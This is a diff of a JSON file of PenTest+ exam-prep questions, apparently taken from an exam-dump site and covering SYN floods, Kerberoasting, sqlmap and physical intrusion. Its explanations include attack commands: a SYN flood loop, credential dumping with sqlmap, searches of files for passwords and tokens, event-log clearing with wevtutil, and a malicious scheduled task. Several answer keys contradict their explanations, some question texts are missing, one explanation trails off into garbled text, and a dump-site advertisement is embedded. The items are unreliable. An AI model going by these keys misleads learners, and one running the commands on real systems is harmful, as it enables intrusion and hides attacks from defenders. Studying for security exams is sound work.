-    "explanation": "A SYN flood attack exploits the TCP handshake by sending a succession of SYN requests to a\ntarget's system.\nEach request initializes a connection that the target system must acknowledge, thus consuming\nresources.\n* Understanding the Script:\n* ip = IP(\"192.168.50.2\"): Sets the destination IP address to 192.168.50.2.\n* tcp = TCP(sport=RandShort(), dport=80, flags=\"S\"): Creates a TCP packet with a random\nsource port, destination port 80, and the SYN flag set.\n* raw = RAW(b\"X\"*1024): Adds 1024 bytes of data to the packet.\n* p = ip/tcp/raw: Combines the IP, TCP, and RAW layers into a single packet.\n* send(p, loop=1, verbose=0): Sends the packet in an infinite loop without verbose output.\n* Purpose of SYN Flood:\n* Resource Exhaustion: By sending numerous SYN requests, the target's connection table fills\nup, preventing legitimate connections.\n* Denial of Service: The target system becomes overwhelmed and unable to process further\nrequests, effectively causing a denial of service.\n* Detection and Mitigation:\n* Rate Limiting: Implement rate limiting on SYN packets.\n* SYN Cookies: Use SYN cookies to handle the connection requests without allocating resources\nimmediately.\n* Firewalls and IDS: Deploy firewalls and Intrusion Detection Systems (IDS) to detect and mitigate\nSYN flood attacks.\n* References from Pentesting Literature:\n* SYN flood attacks are a classic example of a denial-of-service attack and are commonly\ndiscussed in penetration testing guides and HTB write-ups for understanding network-based\nattacks.\nStep-by-Step ExplanationReferences:\n* Penetration Testing - A Hands-on Introduction to Hacking\n* HTB Official Writeups",
-    "category": "2.0"
-  },
-  {
-    "id": "q113-23",
-    "number": 23,
-    "question": "During a vulnerability assessment, a penetration tester configures the scanner sensor and performs the initial vulnerability scanning under the client's internal network. The tester later discusses the results with the client, but the client does not accept the results. The client indicates the host and assets that were within scope are not included in the vulnerability scan results. Which of the following should the tester have done?",
-    "options": {
-      "A": "Rechecked the scanner configuration.",
-      "B": "Performed a discovery scan.",
-      "C": "Used a different scan engine.",
-      "D": "Configured all the TCP ports on the scan."
-    },
-    "answer": "B",
-    "explanation": "When the client indicates that the scope's hosts and assets are not included in the vulnerability\nscan results, it suggests that the tester may have missed discovering all the devices in the scope.\nHere's the best course of action:\nPerforming a Discovery Scan:\nPurpose: A discovery scan identifies all active devices on the network before running a detailed\nvulnerability scan. It ensures that all in-scope devices are included in the assessment.\nProcess: The discovery scan uses techniques like ping sweeps, ARP scans, and port scans to\nidentify active hosts and services.\nComparison with Other Actions:\nRechecking the Scanner Configuration (A): Useful but not as comprehensive as ensuring all hosts\nare discovered.\nUsing a Different Scan Engine (C): Not necessary if the issue is with host discovery rather than\nthe scanner's capability.\nConfiguring All TCP Ports on the Scan (D): Helps in detailed scanning but does not address\nmissing hosts.\nPerforming a discovery scan ensures that all in-scope devices are identified and included in the\nvulnerability assessment, making it the best course of action.",
-    "category": "2.0"
-  },
-  {
-    "id": "q113-24",
-    "number": 24,
-    "question": "During a penetration test, the tester identifies several unused services that are listening on all targeted internal laptops. Which of the following technical controls should the tester recommend to reduce the risk of compromise?",
-    "options": {
-      "A": "Multifactor authentication",
-      "B": "Patch management",
-      "C": "System hardening",
-      "D": "Network segmentation"
-    },
-    "answer": "C",
-    "explanation": "When a penetration tester identifies several unused services listening on targeted internal\nlaptops, the most appropriate recommendation to reduce the risk of compromise is system\nhardening. Here's why:\nSystem Hardening:\nPurpose: System hardening involves securing systems by reducing their surface of vulnerability.\nThis includes disabling unnecessary services, applying security patches, and configuring systems\nsecurely.\nImpact: By disabling unused services, the attack surface is minimized, reducing the risk of these\nservices being exploited by attackers.\nComparison with Other Controls:\nMultifactor Authentication (A): While useful for securing authentication, it does not address the\nissue of unused services running on the system.\nPatch Management (B): Important for addressing known vulnerabilities but not specifically related\nto disabling unused services.\nNetwork Segmentation (D): Helps in containing breaches but does not directly address the issue\nof unnecessary services.\nSystem hardening is the most direct control for reducing the risk posed by unused services,\nmaking it the best recommendation.",
-    "category": "3.0"
-  },
-  {
     "id": "q113-25",
     "number": 25,
     "question": "During a penetration test, a tester captures information about an SPN account. Which of the following attacks requires this information as a prerequisite to proceed?",
@@ -1724,34 +1430,6 @@
     },
     "answer": "B",
     "explanation": "Kerberoasting is an attack that specifically targets Service Principal Name (SPN) accounts in a\nWindows Active Directory environment. Here's a detailed explanation:\nUnderstanding SPN Accounts:\nSPNs are unique identifiers for services in a network that allows Kerberos to authenticate service\naccounts.\nThese accounts are often associated with services such as SQL Server, IIS, etc.\nKerberoasting Attack:\nPrerequisite: Knowledge of the SPN account.\nProcess: An attacker requests a service ticket for the SPN account using the Kerberos protocol.\nThe ticket is encrypted with the service account's NTLM hash. The attacker captures this ticket\nand attempts to crack the hash offline.\nObjective: To obtain the plaintext password of the service account, which can then be used for\nlateral movement or privilege escalation.\nComparison with Other Attacks:\nGolden Ticket: Involves forging Kerberos TGTs using the KRBTGT account hash, requiring\ndomain admin credentials.\nDCShadow: Involves manipulating Active Directory data by impersonating a domain controller,\ntypically requiring high privileges.\nLSASS Dumping: Involves extracting credentials from the LSASS process on a Windows\nmachine, often requiring local admin privileges.\nKerberoasting specifically requires the SPN account information to proceed, making it the correct\nanswer.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-26",
-    "number": 26,
-    "question": "During an assessment, a penetration tester exploits an SQLi vulnerability. Which of the following commands would allow the penetration tester to enumerate password hashes?",
-    "options": {
-      "A": "sqlmap -u www.example.com/?id=1 --search -T user",
-      "B": "sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred",
-      "C": "sqlmap -u www.example.com/?id=1 --tables -D accounts",
-      "D": "sqlmap -u www.example.com/?id=1 --schema --current-user --current-db"
-    },
-    "answer": "A",
-    "explanation": "To enumerate password hashes using an SQL injection vulnerability, the penetration tester needs\nto extract specific columns from the database that typically contain password hashes. The --dump\ncommand in sqlmap is used to dump the contents of the specified database table. Here's a\nbreakdown of the options:\nOption A: sqlmap -u www.example.com/?id=1 --search -T user\nThe --search option is used to search for columns and not to dump data. This would not\nenumerate password hashes.\nOption B: sqlmap -u www.example.com/?id=1 --dump -D accounts -T users -C cred This\ncommand uses --dump to extract data from the specified database accounts, table users, and\ncolumn cred.\nThis is the correct option to enumerate password hashes, assuming cred is the column containing\nthe password hashes.\nOption C: sqlmap -u www.example.com/?id=1 --tables -D accounts\nThe --tables option lists all tables in the specified database but does not extract data.\nOption D: sqlmap -u www.example.com/?id=1 --schema --current-user --current-db The --schema\noption provides the database schema information, and --current-user and --current-db provide\ninformation about the current user and database but do not dump data.\nReferences from Pentest:\nWriteup HTB: Demonstrates using sqlmap to dump data from specific tables to retrieve sensitive\ninformation, including password hashes.\nLuke HTB: Shows the process of exploiting SQL injection to extract user credentials and hashes\nby dumping specific columns from the database.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-27",
-    "number": 27,
-    "question": "While conducting an assessment, a penetration tester identifies details for several unreleased products announced at a company-wide meeting. Which of the following attacks did the tester most likely use to discover this information?",
-    "options": {
-      "A": "Eavesdropping",
-      "B": "Bluesnarfing",
-      "C": "Credential harvesting",
-      "D": "SQL injection attack"
-    },
-    "answer": "A",
-    "explanation": "The tester gained information by listening to a private discussion, which is eavesdropping\n(passive reconnaissance).\n* Option A (Eavesdropping) #: Correct.\n* Involves intercepting conversations via audio, network traffic, or wireless signals.\n* Option B (Bluesnarfing) #: Stealing data via Bluetooth, which is not mentioned.\n* Option C (Credential harvesting) #: No password collection occurred.\n* Option D (SQL injection) #: SQLi affects databases, not voice communications.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - OSINT & Eavesdropping Techniques",
     "category": "1.0"
   },
   {
@@ -1781,48 +1459,6 @@
     "answer": "D",
     "explanation": "OS identification in tools like Nmap relies on fingerprinting techniques, which analyze response\ncharacteristics (e.g., TCP/IP stack behavior).\nThe scan cannot gather one or more fingerprints from the target (Option D):\nIf the system is configured to block ICMP responses, or if certain ports are closed, fingerprinting\nfails.\nSome modern firewalls and intrusion prevention systems (IPS) interfere with OS fingerprinting by\nmodifying packet responses.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Network Scanning and\nFingerprinting Challenges\" Incorrect options:\nOption A (Firewall block rule): A firewall may block the scan, but typically it would result in no\nresponse rather than an \"OS identification failed\" message.\nOption B (Outdated scanner database): While an outdated database might miss vulnerabilities, it\ndoes not directly cause OS detection failure.\nOption C (False positive): A false positive refers to incorrect detection, but this is an OS detection\nfailure, not a misidentified OS.",
     "category": "2.0"
-  },
-  {
-    "id": "q113-30",
-    "number": 30,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "DNS enumeration",
-      "B": "Privilege escalation",
-      "C": "Command injection",
-      "D": "A list of available users"
-    },
-    "answer": "B",
-    "explanation": "The tester is attempting to register a malicious DLL as a server-level plugin to escalate privileges.\nPrivilege escalation (Option B):\nThe command uses dnscmd.exe, a legitimate Windows tool for managing DNS servers.\nBy setting a malicious DLL (adduser.dll) as a server-level plugin, attackers can gain SYSTEM-\nlevel privileges.\nThis technique is a DLL hijacking attack.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Windows Privilege Escalation\nTechniques\" Incorrect options:\nOption A (DNS enumeration): The command modifies DNS settings rather than querying them.\nOption C (Command injection): The attacker is not injecting arbitrary shell commands.\nOption D (List of users): The command does not retrieve user information.et unauthorized access\nto",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-31",
-    "number": 31,
-    "question": "Which of the following could be used to enhance the quality and reliability of a vulnerability scan report?",
-    "options": {
-      "A": "Risk analysis",
-      "B": "Peer review",
-      "C": "Root cause analysis",
-      "D": "Client acceptance"
-    },
-    "answer": "A",
-    "explanation": "A peer review ensures the accuracy, completeness, and objectivity of a penetration test report.\n* Option A (Risk analysis) #: Helps prioritize vulnerabilities but does not validate report accuracy.\n* Option B (Peer review) #: Correct.\n* Ensures report accuracy and consistency.\n* Identifies misinterpretations or missing details.\n* Option C (Root cause analysis) #: Helps in remediation but does not verify report quality.\n* Option D (Client acceptance) #: A client review is final verification, but peer review happens\nearlier to ensure accuracy.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Reporting & Quality Assurance\nValid PT0-003 Dumps shared by ExamDiscuss.com for Helping Passing PT0-003 Exam!\nExamDiscuss.com now offer the newest PT0-003 exam dumps , the ExamDiscuss.com\nPT0-003 exam questions have been updated and answers have been corrected get the\nnewest ExamDiscuss.com PT0-003 dumps with Test Engine here:\nhttps://www.examdiscuss.com/CompTIA/exam/PT0-003/premium/ ( 274 Q&As Dumps,\n35%OFF Special Discount Code: freecram )",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-32",
-    "number": 32,
-    "question": "During an assessment, a penetration tester obtains a low-privilege shell and then runs the following command: findstr /SIM /C:\"pass\" *.txt *.cfg *.xml Which of the following is the penetration tester trying to enumerate?",
-    "options": {
-      "A": "Configuration files",
-      "B": "Permissions",
-      "C": "Virtual hosts",
-      "D": "Secrets"
-    },
-    "answer": "D",
-    "explanation": "By running the command findstr /SIM /C:\"pass\" *.txt *.cfg *.xml, the penetration tester is trying to\nenumerate secrets.\nCommand Analysis:\nfindstr: A command-line utility in Windows used to search for specific strings in files.\n/SIM: Combination of options; /S searches for matching files in the current directory and all\nsubdirectories, /I specifies a case-insensitive search, and /M prints only the filenames with\nmatching content.\n/C:\"pass\": Searches for the literal string \"pass\".\n***.txt .cfg .xml: Specifies the file types to search within.\nObjective:\nThe command is searching for the string \"pass\" within .txt, .cfg, and .xml files, which is indicative\nof searching for passwords or other sensitive information (secrets).\nThese file types commonly contain configuration details, credentials, and other sensitive data that\nmight include passwords or secrets.\nOther Options:\nConfiguration files: While .cfg and .xml files can be configuration files, the specific search for\n\"pass\" indicates looking for secrets like passwords.\nPermissions: This command does not check or enumerate file permissions.\nVirtual hosts: This command is not related to enumerating virtual hosts.\nPentest References:\nPost-Exploitation: Enumerating sensitive information like passwords is a common post-\nexploitation activity after gaining initial access.\nCredential Discovery: Searching for stored credentials within configuration files and documents to\nescalate privileges or move laterally within the network.\nBy running this command, the penetration tester aims to find stored passwords or other secrets\nthat could help in further exploitation of the target system.",
-    "category": "1.0"
   },
   {
     "id": "q113-33",
@@ -1895,20 +1531,6 @@
     "category": "1.0"
   },
   {
-    "id": "q113-38",
-    "number": 38,
-    "question": "A penetration tester finished a security scan and uncovered numerous vulnerabilities on several hosts. Based on the targets' EPSS and CVSS scores, which of the following targets is the most likely to get attacked? Host | CVSS | EPSS Target 1 | 4 | 0.6 Target 2 | 2 | 0.3 Target 3 | 1 | 0.6 Target 4 | 4.5 | 0.4",
-    "options": {
-      "A": "Target 1: CVSS Score = 4 and EPSS Score = 0.6",
-      "B": "Target 2: CVSS Score = 2 and EPSS Score = 0.3",
-      "C": "Target 3: CVSS Score = 1 and EPSS Score = 0.6",
-      "D": "Target 4: CVSS Score = 4.5 and EPSS Score = 0.4"
-    },
-    "answer": "A",
-    "explanation": "Based on the CVSS (Common Vulnerability Scoring System) and EPSS (Exploit Prediction\nScoring System) scores, Target 1 is the most likely to get attacked.\n* CVSS:\n* Definition: CVSS provides a numerical score to represent the severity of a vulnerability, helping\nto prioritize the response based on the potential impact.\n* Score Range: Scores range from 0 to 10, with higher scores indicating more severe\nvulnerabilities.\n* EPSS:\n* Definition: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within\nthe next 30 days.\n* Score Range: EPSS scores range from 0 to 1, with higher scores indicating a higher likelihood\nof exploitation.\n* Analysis:\n* Target 1: CVSS = 4, EPSS = 0.6\n* Target 2: CVSS = 2, EPSS = 0.3\n* Target 3: CVSS = 1, EPSS = 0.6\n* Target 4: CVSS = 4.5, EPSS = 0.4\n* Target 1 has a moderate CVSS score and a high EPSS score, indicating it has a significant\nvulnerability that is quite likely to be exploited.\nPentest References:\n* Vulnerability Prioritization: Using CVSS and EPSS scores to prioritize vulnerabilities based on\nseverity and likelihood of exploitation.\n* Risk Assessment: Understanding the balance between impact (CVSS) and exploit likelihood\n(EPSS) to identify the most critical targets for remediation or attack.\nBy focusing on Target 1, which has a balanced combination of severity and exploitability, the\npenetration tester can address the most likely target for attacks based on the given scores.",
-    "category": "3.0"
-  },
-  {
     "id": "q113-39",
     "number": 39,
     "question": "A company hires a penetration tester to perform an external attack surface review as part of a security engagement. The company informs the tester that the main company domain to investigate is comptia.org. Which of the following should the tester do to accomplish the assessment objective?",
@@ -1921,20 +1543,6 @@
     "answer": "A",
     "explanation": "Comprehensive and Detailed Explanation:\nAn external attack surface review focuses on identifying publicly accessible assets that an\nattacker could exploit. The first step in this process is information gathering, which involves\nenumerating domains, subdomains, public IPs, DNS records, and other internet-facing resources.\nThis is done using passive reconnaissance tools such as Whois, Shodan, Google Dorking, and\nOSINT techniques.\nOption A is correct because it aligns with the assessment goal-finding public-facing systems and\ntheir vulnerabilities before an attacker does.\nOption B (phishing assessment) is incorrect because it involves social engineering, which is not\npart of an external attack surface review.\nOption C (physical security review) is incorrect as it pertains to physical penetration testing, not\nan external attack analysis.\nOption D (vulnerability assessment) is incorrect because a vulnerability assessment is a later step\nafter reconnaissance. The first step is identifying assets through information gathering.\nReference: CompTIA PenTest+ PT0-003 Official Guide - Chapter 4 (Information Gathering and\nOSINT).",
     "category": "1.0"
-  },
-  {
-    "id": "q113-40",
-    "number": 40,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "Clone badge information in public areas of the facility to gain access to restricted areas.",
-      "B": "Tailgate into the facility during a very busy time to gain initial access.",
-      "C": "Pick the lock on the rear entrance to gain access to the facility and try to gain access.",
-      "D": "Drop USB devices with malware outside of the facility in order to gain access to internal machines."
-    },
-    "answer": "B",
-    "explanation": "In an authorized physical assessment, the goal is to test physical security controls. Tailgating is a\ncommon and effective technique in such scenarios. Here's why option B is correct:\nTailgating: This involves following an authorized person into a secure area without proper\ncredentials. During busy times, it's easier to blend in and gain access without being noticed. It\ntests the effectiveness of physical access controls and security personnel.\nCloning Badge Information: This can be effective but requires proximity to employees and\nspecialized equipment, making it more complex and time-consuming.\nPicking Locks: This is a more invasive technique that carries higher risk and is less stealthy\ncompared to tailgating.\nDropping USB Devices: This tests employee awareness and response to malicious devices but\ndoes not directly test physical access controls.\nReferences from Pentest:\nWriteup HTB: Demonstrates the effectiveness of social engineering and tailgating techniques in\nbypassing physical security measures.\nForge HTB: Highlights the use of non-invasive methods like tailgating to test physical security\nwithout causing damage or raising alarms.\nConclusion:\nOption B, tailgating into the facility during a busy time, is the best attack plan to gain access to the\nfacility in an authorized physical assessment.",
-    "category": "2.0"
   },
   {
     "id": "q113-41",
@@ -1963,34 +1571,6 @@
     "answer": "A",
     "explanation": "To maintain persistence after a reboot, the tester needs a method that automatically restarts\nwhen the system reboots.\n* Option A (Reverse shell) #: Reverse shells do not persist after a reboot unless paired with\nscheduled tasks or registry modifications.\n* Option B (Process injection) #: Injecting into a process is temporary-once the system reboots,\nthe injected process is gone.\n* Option C (Scheduled task) #: Correct.\n* A scheduled task can execute malware, reverse shells, or scripts on system startup, ensuring\npersistence.\n* Example:\nschtasks /create /sc onlogon /tn \"SystemUpdate\" /tr \"C:\\malicious.exe\"\n* Option D (Credential dumping) #: While useful for privilege escalation, it does not provide\npersistence.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Persistence Techniques",
     "category": "1.0"
-  },
-  {
-    "id": "q113-43",
-    "number": 43,
-    "question": "A penetration tester successfully clones a source code repository and then runs the following command: find . -type f -exec egrep -i \"token|key|login\" {} \\; Which of the following is the penetration tester conducting?",
-    "options": {
-      "A": "Data tokenization",
-      "B": "Secrets scanning",
-      "C": "Password spraying",
-      "D": "Source code analysis"
-    },
-    "answer": "B",
-    "explanation": "Penetration testers search for hardcoded credentials, API keys, and authentication tokens in\nsource code repositories to identify secrets leakage.\nSecrets scanning (Option B):\nThe find and egrep command scans all files recursively for sensitive keywords like \"token,\" \"key,\"\nand\n\"login\".\nAttackers use tools like TruffleHog and GitLeaks to automate secret discovery.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Source Code Review and Secret\nLeakage\" Incorrect options:\nOption A (Data tokenization): Tokenization replaces sensitive data with unique tokens, not\nscanning for credentials.\nOption C (Password spraying): Tries common passwords across multiple accounts, unrelated to\nscanning source code.\nOption D (Source code analysis): Broader than secrets scanning; this question focuses\nspecifically on credential discovery.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-44",
-    "number": 44,
-    "question": "Which of the following is within the scope of proper handling and is most crucial when working on a penetration testing report?",
-    "options": {
-      "A": "Keeping both video and audio of everything that is done",
-      "B": "Keeping the report to a maximum of 5 to 10 pages in length",
-      "C": "Basing the recommendation on the risk score in the report",
-      "D": "Making the report clear for all objectives with a precise executive summary"
-    },
-    "answer": "D",
-    "explanation": "A well-structured penetration testing report should be clear, objective-driven, and include an\nexecutive summary to communicate findings effectively to both technical teams and executives.\n* Option A (Keeping video/audio of everything) #: Not required. Video/audio documentation is\nrarely used in penetration testing reports.\n* Option B (Keeping reports 5-10 pages) #: Reports vary in length based on scope and\ncomplexity. There is no strict page limit.\n* Option C (Basing recommendations on risk score) #: Risk scores are important, but the report\nshould also provide remediation guidance, exploitability context, and business impact.\n* Option D (Clear objectives & executive summary) #: Correct.\n* The executive summary helps non-technical stakeholders understand risks and priorities.\n* The report should be detailed yet clear, focusing on findings, impact, and remediation.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Penetration Testing Reports &\nCommunication",
-    "category": "2.0"
   },
   {
     "id": "q113-45",
@@ -2035,48 +1615,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-48",
-    "number": 48,
-    "question": "During a pre-engagement activity with a new customer, a penetration tester looks for assets to test. Which of the following is an example of a target that can be used for testing?",
-    "options": {
-      "A": "API",
-      "B": "HTTP",
-      "C": "IPA",
-      "D": "ICMP"
-    },
-    "answer": "A",
-    "explanation": "An API (Application Programming Interface) is a common target in penetration testing, especially\nin modern web and mobile applications. APIs can be entry points for injection attacks,\nauthentication bypasses, and data leakage.\nFrom the CompTIA PenTest+ PT0-003 Official Study Guide (Chapter 1 - Planning and Scoping):\n\"Testers should identify all targets, including web applications, APIs, and other exposed services\nas part of the rules of engagement.\" Reference: Chapter 1, CompTIA PenTest+ PT0-003 Official\nStudy Guide",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-49",
-    "number": 49,
-    "question": "During a security assessment, a penetration tester gains access to an internal server and manipulates some data to hide its presence. Which of the following is the best way for the penetration tester to hide the activities performed?",
-    "options": {
-      "A": "Clear the Windows event logs.",
-      "B": "Modify the system time.",
-      "C": "Alter the log permissions.",
-      "D": "Reduce the log retention settings."
-    },
-    "answer": "A",
-    "explanation": "During a penetration test, one of the critical steps for maintaining access and covering tracks is to\nclear evidence of the attack. Manipulating data to hide activities on an internal server involves\nensuring that logs and traces of the attack are removed. Here's a detailed explanation of why\nclearing the Windows event logs is the best method for this scenario:\n* Understanding Windows Event Logs: Windows event logs are a key forensic artifact that records\nsystem, security, and application events. These logs can provide detailed information about user\nactivities, system changes, and potential security incidents.\n* Why Clear Windows Event Logs:\n* Comprehensive Coverage: Clearing the event logs removes all recorded events, including login\nattempts, application errors, and security alerts. This makes it difficult for an investigator to trace\nback the actions performed by the attacker.\n* Avoiding Detection: Penetration testers clear event logs to ensure that their presence and\nactivities are not detected by system administrators or security monitoring tools.\n* Method to Clear Event Logs:\n* Use the built-in Windows command line utility wevtutil to clear logs. For example:\nshell\nCopy code\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n* These commands clear the System, Security, and Application logs, respectively.\n* Alternative Options and Their Drawbacks:\n* Modify the System Time: Changing the system time can create confusion but is easily\ndetectable and can be reverted. It does not erase existing log entries.\n* Alter Log Permissions: Changing permissions might prevent new entries but does not remove\nexisting ones and can alert administrators to suspicious activity.\n* Reduce Log Retention Settings: This can limit future logs but does not affect already recorded\nlogs and can be easily noticed by administrators.\n* Case References:\n* HTB Writeups: Many Hack The Box (HTB) writeups demonstrate the importance of clearing logs\npost-exploitation to maintain stealth. For example, in the \"Gobox\" and \"Writeup\" machines,\nmaintaining a low profile involved managing log data to avoid detection.\n* Real-World Scenarios: In real-world penetration tests, attackers often clear logs to avoid\ndetection by forensic investigators and incident response teams. This step is crucial during red\nteam engagements and advanced persistent threat (APT) simulations.\nIn conclusion, clearing Windows event logs is a well-established practice for hiding activities\nduring a penetration test. It is the most effective way to remove evidence of the attack from the\nsystem, thereby maintaining stealth and ensuring that the tester's actions remain undetected.",
-    "category": "1.0"
-  },
-  {
-    "id": "q113-50",
-    "number": 50,
-    "question": "[Question text missing from source PDF extract]",
-    "options": {
-      "A": "A password-spraying attack against the authentication system",
-      "B": "A brute-force attack against the authentication system",
-      "C": "A replay attack against the authentication flow in the system",
-      "D": "A mask attack against the authentication system"
-    },
-    "answer": "C",
-    "explanation": "OpenID Connect (OIDC) with OAuth allows applications to authenticate users using third-party\nidentity providers (IdPs). If dynamic registration is enabled, attackers can abuse this feature to\ncapture and replay authentication requests.\nReplay attack (Option C):\nAttackers capture legitimate authentication tokens and reuse them to impersonate users.\nOIDC uses JWTs (JSON Web Tokens), which may not expire quickly, making replay attacks\nhighly effective.\nReference: CompTIA PenTest+ PT0-003 Official Study Guide - \"Attacking Identity Providers and\nOAuth\" Incorrect options:\nOption A (Password spraying): Effective against user accounts, but this attack targets\nauthentication tokens.\nOption B (Brute-force attack): Less effective against OAuth-based authentication since tokens\nreplace passwords.\nOption D (Mask attack): Related to password cracking, not OAuth authentication attacks.",
-    "category": "4.0"
-  },
-  {
     "id": "q113-51",
     "number": 51,
     "question": "A penetration tester wants to create a malicious QR code to assist with a physical security assessment. Which of the following tools has the built-in functionality most likely needed for this task?",
@@ -2105,20 +1643,6 @@
     "category": "3.0"
   },
   {
-    "id": "q113-53",
-    "number": 53,
-    "question": "A penetration testing team wants to conduct DNS lookups for a set of targets provided by the client. The team crafts a Bash script for this task. However, they find a minor error in one line of the script: 1 #!/bin/bash 2 for i in $(cat example.txt); do 3 curl $i 4 done Which of the following changes should the team make to line 3 of the script?",
-    "options": {
-      "A": "resolvconf $i",
-      "B": "rndc $i",
-      "C": "systemd-resolve $i",
-      "D": "host $i"
-    },
-    "answer": "D",
-    "explanation": "Script Analysis:\nLine 1: #!/bin/bash - This line specifies the script should be executed in the Bash shell.\nLine 2: for i in $(cat example.txt); do - This line starts a loop that reads each line from the file\nexample.txt and assigns it to the variable i.\nLine 3: curl $i - This line attempts to fetch the content from the URL stored in i using curl.\nHowever, for DNS lookups, curl is inappropriate.\nLine 4: done - This line ends the loop.\nError Identification:\nThe curl command is used for transferring data from or to a server, often used for HTTP requests,\nwhich is not suitable for DNS lookups.\nCorrect Command:\nTo perform DNS lookups, the host command should be used. The host command performs DNS\nlookups and displays information about the given domain.\nCorrected Script:\nReplace curl $i with host $i to perform DNS lookups on each target specified in example.txt.\nPentest References:\nIn penetration testing, DNS enumeration is a crucial step. It involves querying DNS servers to\ngather information about the target domain, which includes resolving domain names to IP\naddresses and vice versa.\nCommon tools for DNS enumeration include host, dig, and nslookup. The host command is\nparticularly straightforward for simple DNS lookups.\nBy correcting the script to use host $i, the penetration testing team can effectively perform DNS\nlookups on the targets specified in example.txt.",
-    "category": "1.0"
-  },
-  {
     "id": "q113-55",
     "number": 55,
     "question": "During a red-team exercise, a penetration tester obtains an employee's access badge. The tester uses the badge's information to create a duplicate for unauthorized entry. Which of the following best describes this action?",
@@ -2131,20 +1655,6 @@
     "answer": "C",
     "explanation": "* RFID Cloning:\n* RFID (Radio-Frequency Identification) cloning involves copying the data from an access badge\nand creating a duplicate that can be used for unauthorized entry.\n* Tools like Proxmark or RFID duplicators are commonly used for this purpose.\n* Why Not Other Options?\n* A (Smurfing): A network-based denial-of-service attack, unrelated to physical access.\n* B (Credential stuffing): Involves using stolen credentials in bulk for authentication attempts,\nunrelated to badge cloning.\n* D (Card skimming): Relates to stealing credit card information, not access badges.\nCompTIA Pentest+ References:\n* Domain 3.0 (Attacks and Exploits)",
     "category": "4.0"
-  },
-  {
-    "id": "q113-56",
-    "number": 56,
-    "question": "A penetration tester finishes a security scan and uncovers numerous vulnerabilities on several hosts. Based on the targets' EPSS (Exploit Prediction Scoring System) and CVSS (Common Vulnerability Scoring System) scores, which of the following targets is the most likely to get attacked?",
-    "options": {
-      "A": "Target 1: EPSS Score = 0.6, CVSS Score = 4",
-      "B": "Target 2: EPSS Score = 0.3, CVSS Score = 2",
-      "C": "Target 3: EPSS Score = 0.6, CVSS Score = 1",
-      "D": "Target 4: EPSS Score = 0.4, CVSS Score = 4.5"
-    },
-    "answer": "A",
-    "explanation": "The EPSS (Exploit Prediction Scoring System) estimates how likely a vulnerability is to be\nexploited. Higher EPSS scores indicate a higher likelihood of exploitation.\n* Option A (Target 1) #:\n* EPSS 0.6 (60% chance of exploitation)\n* CVSS 4 (Medium severity)\n* # Best candidate since it has the highest likelihood of exploitation.\n* Option B (Target 2) #: EPSS 0.3 (30%) is lower, making it less likely to be attacked.\n* Option C (Target 3) #: EPSS 0.6 is high, but CVSS 1 is very low, meaning the vulnerability is not\ncritical.\n* Option D (Target 4) #: CVSS 4.5 is higher, but EPSS 0.4 is lower, meaning attackers are less\nlikely to exploit it.\n# Reference: CompTIA PenTest+ PT0-003 Official Guide - Vulnerability Prioritization with EPSS\n& CVSS",
-    "category": "3.0"
   },
   {
     "id": "q113-57",
@@ -2161,20 +1671,6 @@
     "category": "2.0"
   },
   {
-    "id": "q113-58",
-    "number": 58,
-    "question": "A penetration tester reviews a SAST vulnerability scan report. The following vulnerability has been reported as high severity: Source file: components.ts Issue 2 of 12: Command injection Severity: High Call: .innerHTML = response The tester inspects the source file and finds the variable response is defined as a constant and is not referred to or used in other sections of the code. Which of the following describes how the tester should classify this reported vulnerability?",
-    "options": {
-      "A": "False negative",
-      "B": "False positive",
-      "C": "True positive",
-      "D": "Low severity"
-    },
-    "answer": "B",
-    "explanation": "A false positive occurs when a vulnerability scan incorrectly flags a security issue that does not\nexist or is not exploitable in the context of the application. Here's the reasoning:\n* Definition of Command Injection:Command injection vulnerabilities occur when user-controllable\ndata is passed to an interpreter or command execution context without proper sanitization,\nallowing an attacker to execute arbitrary commands.\n* Code Analysis:\n* The response variable is defined as a constant (const), which implies its value is immutable\nduring runtime.\n* The response is not sourced from user input nor used elsewhere, meaning there is no attack\nsurface or exploitation pathway for an attacker to influence the content of response.\n* Scanner Misclassification:Static Application Security Testing (SAST) tools may flag\nvulnerabilities based on patterns (e.g., .innerHTML usage) without assessing the source and flow\nof data, resulting in false positives.\n* Final Classification:Since the response variable is static and unchangeable, the flagged issue is\nnot exploitable. This makes it a false positive.\nCompTIA Pentest+ References:\n* Domain 3.0 (Attacks and Exploits)\n* Domain 4.0 (Penetration Testing Tools)\n* OWASP Static Code Analysis Guide",
-    "category": "2.0"
-  },
-  {
     "id": "q113-59",
     "number": 59,
     "question": "Which of the following elements in a lock should be aligned to a specific level to allow the key cylinder to turn?",
@@ -2187,35 +1683,6 @@
     "answer": "B",
     "explanation": "In a pin tumbler lock, the key interacts with a series of pins within the lock cylinder. Here's a\ndetailed breakdown:\nComponents of a Pin Tumbler Lock:\nKey Pins: These are the pins that the key directly interacts with. The cuts on the key align these\npins.\nDriver Pins: These are pushed by the springs and sit between the key pins and the springs.\nSprings: These apply pressure to the driver pins.\nPlug: This is the part of the lock that the key is inserted into and turns when the correct key is\nused.\nCylinder: The housing for the plug and the pins.\nOperation:\nWhen the correct key is inserted, the key pins are pushed up by the key's cuts to align with the\nshear line (the gap between the plug and the cylinder).\nThe alignment of the pins at the shear line allows the plug to turn, thereby operating the lock.\nWhy Pins Are the Correct answer:\nThe correct key aligns the key pins and driver pins to the shear line, allowing the plug to turn. If\nany pin is not correctly aligned, the lock will not open.\nIllustration in Lock Picking:\nLock picking involves manipulating the pins so they align at the shear line without the key. This\ndemonstrates the critical role of pins in the functioning of the lock.",
